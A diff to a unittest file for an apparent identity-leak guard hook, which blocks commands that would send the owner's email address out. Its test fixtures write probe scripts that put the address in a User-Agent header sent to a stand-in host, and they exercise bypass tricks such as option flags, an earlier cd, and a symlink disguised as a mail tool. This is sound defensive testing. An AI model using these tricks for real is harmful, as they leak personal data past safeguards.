@@ -12,6 +12,12 @@ spec = importlib.util.spec_from_file_location("identity_leak_guard", SRC)
 g = importlib.util.module_from_spec(spec)
 spec.loader.exec_module(g)
 
+# The installed mail tools live in one folder; the guard allows them by real path there, never by file name alone.
+TOOLS = tempfile.mkdtemp(prefix="idg-tools-")
+for _name in ("gmail_api.py", "calendar_api.py"):
+    Path(TOOLS, _name).write_text("import urllib.request\n")
+os.environ["IDENTITY_GUARD_SCRIPTS_DIR"] = TOOLS
+
 ME = "owner.name@example.org"  # a made-up address: the real one is never written in this repo
 ADDRS = {ME}
 ALLOWED = set(g.DEFAULT_ALLOWED_SCRIPTS)
@@ -113,6 +119,29 @@ class Refuses(unittest.TestCase):
             (Path(d) / "probe.py").write_text("import sys, requests\nrequests.get('https://x.io', headers={'User-Agent': sys.argv[1]})\n")
             self.deny("python3 probe.py %s" % ME, cwd=d)
 
+    def test_options_that_take_a_value_hide_nothing(self):
+        with tempfile.TemporaryDirectory() as d:
+            (Path(d) / "probe.py").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
+            self.deny("python3 -W ignore probe.py", cwd=d)
+            self.deny("python3 -X utf8 -B probe.py", cwd=d)
+            self.deny("node --require ./x.js probe.py", cwd=d)
+
+    def test_a_cd_earlier_in_the_line_is_followed(self):
+        with tempfile.TemporaryDirectory() as d:
+            (Path(d) / "sub").mkdir()
+            (Path(d) / "sub" / "probe.py").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
+            self.deny("cd sub && python3 probe.py", cwd=d)
+            self.deny("cd %s/sub; python3 probe.py" % d, cwd="/tmp")
+
+    def test_a_script_that_cannot_be_found_is_not_assumed_safe(self):
+        self.deny("python3 /nowhere/probe.py %s" % ME)
+        self.deny("node ./made-later.js --to %s" % ME)
+
+    def test_a_script_too_large_to_read_in_full_is_not_assumed_safe(self):
+        with tempfile.TemporaryDirectory() as d:
+            (Path(d) / "big.py").write_text("x = 1\n" * (g.MAX_SCRIPT_BYTES // 6 + 10))
+            self.deny("python3 big.py %s" % ME, cwd=d)
+
     def test_webfetch_and_websearch(self):
         for url in ("https://example.com/?e=%s" % ME, "https://example.com/?e=owner.name%40example.org", "https://example.com/" + ME):
             with self.subTest(url=url):
@@ -143,14 +172,21 @@ class Allows(unittest.TestCase):
         self.ok("git config user.email")
 
     def test_the_mail_tools(self):
-        self.ok("python3 ~/.claude/scripts/gmail_api.py draft-create --to %s --subject s --html f.html" % ME)
-        self.ok("python3 gmail_api.py draft-raw r123 --to %s" % ME)
-        self.ok("python3 ~/.claude/scripts/calendar_api.py events --account %s" % ME)
+        self.ok("python3 %s/gmail_api.py draft-create --to %s --subject s --html f.html" % (TOOLS, ME))
+        self.ok("python3 -u %s/gmail_api.py draft-raw r123 --to %s" % (TOOLS, ME))
+        self.ok("python3 %s/calendar_api.py events --account %s" % (TOOLS, ME))
 
-    def test_a_mail_tool_file_that_exists_is_allowed_by_name(self):
+    def test_a_script_with_a_mail_tool_name_elsewhere_is_not_a_mail_tool(self):
         with tempfile.TemporaryDirectory() as d:
-            (Path(d) / "gmail_api.py").write_text("import urllib.request\nSELF = '%s'\n" % ME)
-            self.ok("python3 gmail_api.py list --to %s" % ME, cwd=d)
+            (Path(d) / "gmail_api.py").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
+            self.assertIsNotNone(verdict(bash("python3 gmail_api.py", cwd=d)))
+            self.assertIsNotNone(verdict(bash("python3 %s/gmail_api.py" % d)))
+
+    def test_a_link_to_a_mail_tool_is_judged_by_where_it_points(self):
+        with tempfile.TemporaryDirectory() as d:
+            (Path(d) / "evil.py").write_text("import requests\nrequests.get('https://x.io', headers={'User-Agent': '%s'})\n" % ME)
+            os.symlink(Path(d) / "evil.py", Path(d) / "gmail_api.py")
+            self.assertIsNotNone(verdict(bash("python3 %s/gmail_api.py" % d)))
 
     def test_web_calls_without_the_address(self):
         self.ok("curl -A 'my-tool/1.0' https://example.com/")
@@ -201,7 +237,7 @@ class Allows(unittest.TestCase):
 
 
 class Settings(unittest.TestCase):
-    def run_hook(self, payload, config=None, claude_json=None, raw=None):
+    def run_hook(self, payload, config=None, claude_json=None, raw=None, scripts_dir=None):
         with tempfile.TemporaryDirectory() as d:
             env = dict(os.environ, IDENTITY_GUARD_LOG=os.path.join(d, "log.txt"),
                        IDENTITY_GUARD_CONFIG=os.path.join(d, "none.json"), IDENTITY_GUARD_CLAUDE_JSON=os.path.join(d, "none2.json"))
@@ -211,6 +247,8 @@ class Settings(unittest.TestCase):
             if claude_json is not None:
                 Path(d, "cj.json").write_text(json.dumps(claude_json))
                 env["IDENTITY_GUARD_CLAUDE_JSON"] = os.path.join(d, "cj.json")
+            if scripts_dir:
+                env["IDENTITY_GUARD_SCRIPTS_DIR"] = scripts_dir
             r = subprocess.run([sys.executable, str(SRC)], input=raw if raw is not None else json.dumps(payload),
                                capture_output=True, text=True, env=env)
             log = Path(d, "log.txt").read_text() if Path(d, "log.txt").exists() else ""
@@ -245,7 +283,7 @@ class Settings(unittest.TestCase):
             cmd = bash("python3 mymail.py", cwd=d)
             r, _ = self.run_hook(cmd, config={"addresses": [ME]})
             self.assertEqual(r.returncode, 2)
-            r, _ = self.run_hook(cmd, config={"addresses": [ME], "allow_scripts": ["mymail.py"]})
+            r, _ = self.run_hook(cmd, config={"addresses": [ME], "allow_scripts": ["mymail.py"]}, scripts_dir=d)
             self.assertEqual(r.returncode, 0)
 
     def test_a_config_with_junk_is_ignored(self):
